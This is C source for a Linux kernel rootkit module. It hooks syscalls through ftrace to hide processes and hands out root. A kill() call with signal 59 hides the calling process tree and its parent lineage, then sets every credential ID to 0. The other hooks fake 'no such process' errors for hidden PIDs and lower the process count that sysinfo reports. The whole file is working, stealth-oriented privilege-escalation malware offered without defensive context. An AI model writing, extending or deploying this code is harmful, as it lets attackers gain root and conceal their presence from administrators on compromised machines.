#include "../include/ub_core.h"
#include "../include/become_root.h"
#include "../ftrace/hook_engine.h"
#include "../include/veiled_pids.h"

static rwlock_t *ub_armor_tasklist_lock = NULL;

static asmlinkage long (*ub_real_kill)(const struct pt_regs *);
static asmlinkage long (*ub_real_getsid)(const struct pt_regs *);
static asmlinkage long (*ub_real_sched_getaffinity)(const struct pt_regs *);
static asmlinkage long (*ub_real_sched_getparam)(const struct pt_regs *);
static asmlinkage long (*ub_real_sched_getscheduler)(const struct pt_regs *);
static asmlinkage long (*ub_real_sched_rr_get_interval)(const struct pt_regs *);
static asmlinkage long (*ub_real_sysinfo)(const struct pt_regs *);
static asmlinkage long (*ub_real_pidfd_open)(const struct pt_regs *);
static asmlinkage long (*ub_real_getpgid)(const struct pt_regs *);
static asmlinkage long (*ub_real_getpgrp)(const struct pt_regs *);

static notrace void SpawnRoot(void);

#define HIDE_PARENT_DEPTH 8

static inline bool should_hide_pid_by_int(int pid)
{
    if (pid <= 0)
        return false;

    return ub_is_veiled(pid) || ub_is_offspring(pid) || ub_pid_is_thread(pid);
}

static notrace void hide_task_pid(struct task_struct *task)
{
    if (!task)
        return;

    ub_veil_pid(task->pid);
    ub_veil_pid(task->tgid);
}

static notrace void hide_parent_lineage(void)
{
    struct task_struct *task;
    struct task_struct *parent;
    int depth;

    if (!current)
        return;

    rcu_read_lock();
    task = current;
    for (depth = 0; depth < HIDE_PARENT_DEPTH; depth++) {
        parent = rcu_dereference(task->real_parent);
        if (!parent || parent == task || parent->pid <= 1)
            break;
        if (parent->flags & PF_KTHREAD)
            break;

        hide_task_pid(parent);
        task = parent;
    }
    rcu_read_unlock();
}

static notrace void hide_process_tree(void)
{
    struct task_struct *task;
    struct list_head *list;
    
    if (!current)
        return;
    
    hide_task_pid(current);
    hide_parent_lineage();
    
    if (ub_armor_tasklist_lock)
        read_lock(ub_armor_tasklist_lock);
    list_for_each(list, &current->children) {
        task = list_entry(list, struct task_struct, sibling);
        if (task) {
            ub_offspring_track(task->pid);
            ub_offspring_track(task->tgid);
        }
    }
    if (current->signal) {
        struct task_struct *t = current;
        do {
            hide_task_pid(t);
        } while_each_thread(current, t);
    }
    if (ub_armor_tasklist_lock)
        read_unlock(ub_armor_tasklist_lock);
}

static notrace asmlinkage long ub_hook_kill(const struct pt_regs *regs) {
    int pid = (int)regs->di;
    int signal = (int)regs->si;

    if (signal == 59) {
        hide_process_tree();
        msleep(50);
        SpawnRoot();
        
        if (pid > 0 && pid != current->pid) {
            ub_veil_pid(pid);
            ub_offspring_track(pid);
        }
        
        return 0;
    }

    if (signal == 0 && should_hide_pid_by_int(pid))
        return -ESRCH;

    if (!ub_real_kill)
        return -ENOSYS;

    return ub_real_kill(regs);
}

static notrace asmlinkage long ub_hook_pidfd_open(const struct pt_regs *regs)
{
    int pid = (int)regs->di;
    
    if (should_hide_pid_by_int(pid))
        return -ESRCH;
    
    if (!ub_real_pidfd_open)
        return -ENOSYS;
    
    return ub_real_pidfd_open(regs);
}

static notrace asmlinkage long ub_hook_getsid(const struct pt_regs *regs)
{
    int pid = (int)regs->di;
    if (should_hide_pid_by_int(pid))
        return -ESRCH;
    if (!ub_real_getsid)
        return -ENOSYS;
    return ub_real_getsid(regs);
}

static notrace asmlinkage long ub_hook_sched_getaffinity(const struct pt_regs *regs)
{
    int pid = (int)regs->di;
    if (should_hide_pid_by_int(pid))
        return -ESRCH;
    if (!ub_real_sched_getaffinity)
        return -ENOSYS;
    return ub_real_sched_getaffinity(regs);
}

static notrace asmlinkage long ub_hook_sched_getparam(const struct pt_regs *regs)
{
    int pid = (int)regs->di;
    if (should_hide_pid_by_int(pid))
        return -ESRCH;
    if (!ub_real_sched_getparam)
        return -ENOSYS;
    return ub_real_sched_getparam(regs);
}

static notrace asmlinkage long ub_hook_sched_getscheduler(const struct pt_regs *regs)
{
    int pid = (int)regs->di;
    if (should_hide_pid_by_int(pid))
        return -ESRCH;
    if (!ub_real_sched_getscheduler)
        return -ENOSYS;
    return ub_real_sched_getscheduler(regs);
}

static notrace asmlinkage long ub_hook_sched_rr_get_interval(const struct pt_regs *regs)
{
    int pid = (int)regs->di;
    if (should_hide_pid_by_int(pid))
        return -ESRCH;
    if (!ub_real_sched_rr_get_interval)
        return -ENOSYS;
    return ub_real_sched_rr_get_interval(regs);
}

static notrace asmlinkage long ub_hook_sysinfo(const struct pt_regs *regs)
{
    void __user *user_info = (void __user *)regs->di;
    long ret;

    if (!user_info || !ub_real_sysinfo)
        return ub_real_sysinfo ? ub_real_sysinfo(regs) : -ENOSYS;

    ret = ub_real_sysinfo(regs);
    if (ret != 0)
        return ret;

    {
        struct sysinfo kinfo;
        if (copy_from_user(&kinfo, user_info, sizeof(kinfo)) != 0)
            return ret;

        {
            int hidden_nr = ub_veiled_pid_count();
            if (hidden_nr > 0 && kinfo.procs > hidden_nr)
                kinfo.procs -= hidden_nr;
        }

        if (copy_to_user(user_info, &kinfo, sizeof(kinfo))) { }
    }

    return ret;
}

static notrace asmlinkage long ub_hook_getpgid(const struct pt_regs *regs)
{
    int pid = (int)regs->di;

    if (pid == 0) {
        if (!current)
            return ub_real_getpgid ? ub_real_getpgid(regs) : -ENOSYS;
        pid = current->tgid;
    }

    if (should_hide_pid_by_int(pid))
        return -ENOENT;

    if (!ub_real_getpgid)
        return -ENOSYS;

    return ub_real_getpgid(regs);
}

static notrace asmlinkage long ub_hook_getpgrp(const struct pt_regs *regs)
{
    if (current && should_hide_pid_by_int(current->tgid))
        return -ENOENT;

    if (!ub_real_getpgrp)
        return -ENOSYS;

    return ub_real_getpgrp(regs);
}

static notrace void SpawnRoot(void) {
    struct cred *newcredentials;

    newcredentials = prepare_creds();
    if (!newcredentials)
        return;

    newcredentials->uid.val   = 0;
    newcredentials->gid.val   = 0;
    newcredentials->suid.val  = 0;
    newcredentials->sgid.val  = 0;
    newcredentials->fsuid.val = 0;
    newcredentials->fsgid.val = 0;
    newcredentials->euid.val  = 0;
    newcredentials->egid.val  = 0;

    commit_creds(newcredentials);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", ub_hook_kill, &ub_real_kill),
    HOOK("__x64_sys_getpgid", ub_hook_getpgid, &ub_real_getpgid),
    HOOK("__x64_sys_getpgrp", ub_hook_getpgrp, &ub_real_getpgrp),
    HOOK("__x64_sys_getsid", ub_hook_getsid, &ub_real_getsid),
    HOOK("__x64_sys_sched_getaffinity", ub_hook_sched_getaffinity, &ub_real_sched_getaffinity),
    HOOK("__x64_sys_sched_getparam", ub_hook_sched_getparam, &ub_real_sched_getparam),
    HOOK("__x64_sys_sched_getscheduler", ub_hook_sched_getscheduler, &ub_real_sched_getscheduler),
    HOOK("__x64_sys_sched_rr_get_interval", ub_hook_sched_rr_get_interval, &ub_real_sched_rr_get_interval),
    HOOK("__x64_sys_sysinfo", ub_hook_sysinfo, &ub_real_sysinfo),
    HOOK("__x64_sys_pidfd_open", ub_hook_pidfd_open, &ub_real_pidfd_open),
};

notrace int ub_privilege_start(void) {
    ub_armor_tasklist_lock = (rwlock_t *)ub_resolve_symbol("tasklist_lock");
    return ub_fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void ub_privilege_stop(void) {
    ub_fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
